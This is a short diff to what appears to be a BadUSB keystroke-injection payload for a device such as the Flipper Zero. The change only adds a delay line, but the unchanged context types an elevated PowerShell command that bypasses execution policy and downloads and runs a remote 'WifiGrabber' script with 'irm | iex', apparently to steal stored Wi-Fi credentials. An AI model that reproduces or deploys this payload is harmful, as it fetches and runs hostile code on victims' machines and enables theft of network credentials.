@@ -3,6 +3,7 @@ DELAY 500
 STRING powershell -Command "Start-Process powershell -ArgumentList '-NoP -Ep Bypass -Command `"irm https://raw.githubusercontent.com/Timmm27/BadUSB-Flipper-Jakoby/refs/heads/main/Wifi-Grabber/WifiGrabber.ps1 | iex`"' -Verb RunAs"
 DELAY 1000
 ENTER
+DELAY 500
 TAB
 DELAY 100
 TAB
